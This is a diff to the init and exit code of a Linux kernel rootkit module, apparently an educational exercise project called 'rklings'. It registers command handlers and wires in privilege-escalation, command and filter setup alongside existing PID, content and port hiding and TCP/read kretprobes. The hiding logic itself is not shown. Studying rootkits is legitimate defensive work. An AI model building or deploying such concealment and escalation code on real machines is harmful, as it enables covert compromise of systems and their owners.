@@ -1,7 +1,20 @@
 // SPDX-License-Identifier: GPL-2.0
+#include "rootkit.h"
 #include <linux/init.h>
 #include <linux/module.h>
-#include "rootkit.h"
+#include <linux/printk.h>
+
+static int cmd_ping(const char *arg)
+{
+	pr_info("rklings: pong\n");
+	return 0;
+}
+
+static int cmd_status(const char *arg)
+{
+	pr_info("rklings: alive\n");
+	return 0;
+}
 
 static int __init rk_init(void)
 {
@@ -11,6 +24,25 @@ static int __init rk_init(void)
 	rk_target_init(&rk_pid_targets);
 	rk_target_init(&rk_content_targets);
 	rk_target_init(&rk_port_targets);
+
+	ret = rk_cmd_register("ping", cmd_ping);
+	if (ret)
+		return ret;
+	ret = rk_cmd_register("status", cmd_status);
+	if (ret)
+		return ret;
+
+	ret = rk_escalate_init();
+	if (ret)
+		return ret;
+
+	ret = rk_module_cmds_init();
+	if (ret)
+		return ret;
+
+	ret = rk_filter_init();
+	if (ret)
+		return ret;
 
 	ret = rk_proc_init();
 	if (ret)
@@ -59,7 +91,7 @@ fail_mkdir:
 
 static void __exit rk_exit(void)
 {
-	rk_uncloak();
+	rk_module_unhide();
 	unregister_kretprobe(&rk_tcp6_probe);
 	unregister_kretprobe(&rk_tcp4_probe);
 	unregister_kretprobe(&rk_read_probe);
